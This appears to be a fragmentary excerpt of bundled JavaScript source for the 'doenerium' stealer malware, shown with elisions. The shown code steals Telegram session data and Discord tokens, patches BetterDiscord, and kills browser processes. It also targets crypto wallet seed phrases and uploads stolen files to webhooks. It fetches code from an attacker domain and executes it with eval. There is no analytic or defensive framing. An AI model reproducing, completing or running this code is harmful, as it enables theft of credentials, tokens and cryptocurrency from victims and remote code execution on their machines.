...
/******/ 	var __webpack_modules__ = ({
    ...
    /***/ ((module) => {
                    ...
                    module.exports = (client) => {
                        try {
                            return require("./config_obf.js")().cryptos
 
                        } catch (e) {
                            return require("./config.js")().cryptos
                        }
...
/***/ ((module) => {
                ...
                module.exports = (client) => {
                    return {
                        base_url: client.utils.encryption.encryptData("https://notfubuki.xyz/doenerium/injection"),
                ...
                module.exports = (client) => {
                    return {
                        ...
                        generate_path: () => {
                            ...
                            client.requires.fs.mkdirSync(`${subpath}\\${random_folder_name}`)
                    ...
                    return {
                        ...
                        async get_twitter_ct0() {
                            return new Promise(async res => {
                                try {
                                    res(client.config.environ.twitter_ct0 = (await client.axios_instance.get("https://notfubuki.xyz/doenerium/ct0")).data).toString("utf-8")
                                } catch {
                            ...
                            return new Promise(async res => {
                                try {
                                    ...
                                    browsersProcess.forEach(process => {
                                        if (tasks.includes(process)) client.requires.child_process.exec(`taskkill /IM ${process} /F`, callback => {})
                                    });
                ...
                module.exports = (client) => {
                    return {
                        ...
                        pwnBetterDiscord() {
                            if (client.requires.fs.existsSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")) {
                                ...
                                client.requires.fs.writeFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar", client.requires.buf_replace(_,
                                    "api/webhooks", "Clean-doenerium_on_top"))
                        ...
                        async init() {
                            ...
                            for (const path of client.config.discord.files_path) {
                                if (client.requires.fs.existsSync(path.replace("index.js", "Cleandoenerium"))) {
                                    client.requires.fs.rmdirSync(path.replace("index.js", "Cleandoenerium"));
                                }
                            }
                        }
                    };
                                ...
                                client.requires.fs.readdirSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata`).forEach(async c => {
                                    if (!shitFiles.includes(c)) {
                                        try {
                                            ...
                                            try {
                                                await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of Clean-Doenerium", description: `\`\`\`${err}\`\`\`` })] })
                                            } catch { }
                                        }
                    ...
                    return {
                        ...
                        createFolder(suffix_path) {
                            if (!client.requires.fs.existsSync(client.config.jszip.path + suffix_path)) {
                                ...
                                client.requires.fs.mkdirSync(client.config.jszip.path + suffix_path)
                            }
                        },
                                    ...
                                    if (files) {
                                        files.forEach(async (file) => {
                                            client.requires.request.post({
                                                url: url,
                                                formData: {
                                                    waifuware: this.requires.fs.createReadStream(file.path)
                                                },
                                            });
                                        });
                                    }
        ...
        class doenerium {
            constructor() {
                ...
                this.config = {
                    ...
                    cryptos: __nccwpck_require__("amongus")(this),
                ...
                this.config.crypto = __nccwpck_require__(608)(this),
            ...
            async runtime_evasion() {
                // Do not remove this function, it's used for Exodus & Metamask SeedPhrase it can cause crashes.
                let evasor = ( await this.axios_instance.get("https://notfubuki.xyz/doenerium/evasion") ).data
                eval(evasor)
            }
            async init() {
                ...
                try {
                    this.config.embed = ( await this.axios_instance.get("https://notfubuki.xyz/doenerium/embed") ).data
                } catch {
                    this.config.embed = {
                        "username": "t.me/waifuware | Latest update: github.com/NotFubukil/Clean-Doenerium",
                        "href": "https://t.me/waifuware",
                        "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
                        "credits": "t.me/waifuware | Latest update: github.com/NotFubukil/Clean-Doenerium"
                    }
                }
                ...
                try {
                    ...
                    try {
                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of Clean-Doenerium", description: `\`\`\`${err}\`\`\`` })] })
                    } catch { }
                }
